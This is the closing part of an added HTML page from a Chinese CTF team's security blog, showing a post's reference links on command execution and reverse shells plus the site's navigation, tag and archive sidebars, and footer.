+<p><a target="_blank" rel="noopener" href="https://chybeta.github.io/2017/11/04/HITCON-CTF-2017-BabyFirst-Revenge-writeup/">HITCON CTF 2017-BabyFirst Revenge-writeup</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/r00tgrok/p/reverse_shell_cheatsheet.html">LINUX下反弹SHELL的种种方式</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/85712">Linux渗透之反弹Shell命令解析</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/88354.html">技术分析：攻击者是如何利用系统命令盲注实现“拖库”的？</a></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://asuri.org/2019/01/17/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/" data-id="clg6iymqj0048guote6wqfu55" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+    <a href="/2019/03/12/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E5%88%B0%E6%8F%90%E6%9D%83/" id="article-nav-newer" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Newer</strong>
+      <div class="article-nav-title">
+        
+          命令执行到提权
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2018/12/25/NUAACTF-2018-%E5%AE%98%E6%96%B9wp/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">NUAACTF_2018 官方wp</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+        <aside id="sidebar">
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Categories</h3>
+    <div class="widget">
+      <ul class="category-list"><li class="category-list-item"><a class="category-list-link" href="/categories/Develop/">Develop</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Devops/">Devops</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Pwn/">Pwn</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Reverse/">Reverse</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Web-%E5%AE%89%E5%85%A8/">Web 安全</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/Writeup/">Writeup</a></li><li class="category-list-item"><a class="category-list-link" href="/categories/%E5%AE%89%E5%8D%93%E5%AE%89%E5%85%A8/">安卓安全</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tags</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/CTF/" rel="tag">CTF</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/CVE-2015-3864/" rel="tag">CVE-2015-3864</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Crypto/" rel="tag">Crypto</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Docker/" rel="tag">Docker</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Pwn/" rel="tag">Pwn</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/RCE/" rel="tag">RCE</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/ROP/" rel="tag">ROP</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Rev/" rel="tag">Rev</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Tools/" rel="tag">Tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/Windows/" rel="tag">Windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/analytics/" rel="tag">analytics</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/googlectf/" rel="tag">googlectf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/jctf/" rel="tag">jctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/mirai/" rel="tag">mirai</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/nuaactf/" rel="tag">nuaactf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/phantom/" rel="tag">phantom</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/php/" rel="tag">php</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/qzone/" rel="tag">qzone</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/reverse/" rel="tag">reverse</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/suctf/" rel="tag">suctf</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/virus/" rel="tag">virus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/windows/" rel="tag">windows</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/writeup/" rel="tag">writeup</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/xss/" rel="tag">xss</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" rel="tag">文件格式漏洞</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Tag Cloud</h3>
+    <div class="widget tagcloud">
+      <a href="/tags/CTF/" style="font-size: 10px;">CTF</a> <a href="/tags/CVE-2015-3864/" style="font-size: 10px;">CVE-2015-3864</a> <a href="/tags/Crypto/" style="font-size: 10px;">Crypto</a> <a href="/tags/Docker/" style="font-size: 10px;">Docker</a> <a href="/tags/Pwn/" style="font-size: 15px;">Pwn</a> <a href="/tags/RCE/" style="font-size: 15px;">RCE</a> <a href="/tags/ROP/" style="font-size: 10px;">ROP</a> <a href="/tags/Rev/" style="font-size: 10px;">Rev</a> <a href="/tags/Tools/" style="font-size: 15px;">Tools</a> <a href="/tags/Windows/" style="font-size: 10px;">Windows</a> <a href="/tags/analytics/" style="font-size: 10px;">analytics</a> <a href="/tags/googlectf/" style="font-size: 15px;">googlectf</a> <a href="/tags/jctf/" style="font-size: 10px;">jctf</a> <a href="/tags/linux/" style="font-size: 15px;">linux</a> <a href="/tags/mirai/" style="font-size: 10px;">mirai</a> <a href="/tags/nuaactf/" style="font-size: 15px;">nuaactf</a> <a href="/tags/phantom/" style="font-size: 10px;">phantom</a> <a href="/tags/php/" style="font-size: 10px;">php</a> <a href="/tags/qzone/" style="font-size: 10px;">qzone</a> <a href="/tags/reverse/" style="font-size: 10px;">reverse</a> <a href="/tags/suctf/" style="font-size: 10px;">suctf</a> <a href="/tags/virus/" style="font-size: 10px;">virus</a> <a href="/tags/windows/" style="font-size: 10px;">windows</a> <a href="/tags/writeup/" style="font-size: 20px;">writeup</a> <a href="/tags/xss/" style="font-size: 15px;">xss</a> <a href="/tags/%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F%E6%BC%8F%E6%B4%9E/" style="font-size: 10px;">文件格式漏洞</a>
+    </div>
+  </div>
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2020/11/">November 2020</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/07/">July 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/01/">January 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/12/">December 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/08/">August 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/05/">May 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2018/01/">January 2018</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/11/">November 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2017/06/">June 2017</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/11/">November 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/10/">October 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/09/">September 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/08/">August 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/06/">June 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2016/04/">April 2016</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/11/">November 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2015/08/">August 2015</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/1970/01/">January 1970</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2020/11/24/2020-Taihuctf-writeup/">2020-Taihuctf-writeup</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part2/">2019-googlectf-writeup-part2</a>
+          </li>
+        
+          <li>
+            <a href="/2019/07/30/2019-googlectf-writeup-part1/">2019-googlectf-writeup-part1</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/22/Asuri_2019/">2019 第十二届全国大学生信息安全竞赛—创新实践能力赛线上赛-Asuri 2019 wp</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/10/PHP%E5%A4%8D%E6%9D%82%E5%8F%98%E9%87%8F/">从一道题讲PHP复杂变量</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2023 All Members<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+      <a href="https://beian.miit.gov.cn/" target="_blank">鲁ICP备15035817号-2</a>
+    </div>
+  </div>
+</footer>
+
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+    <a href="/members" class="mobile-nav-link">Members</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+    
+  </div>
+
+</body>
+
+</html>
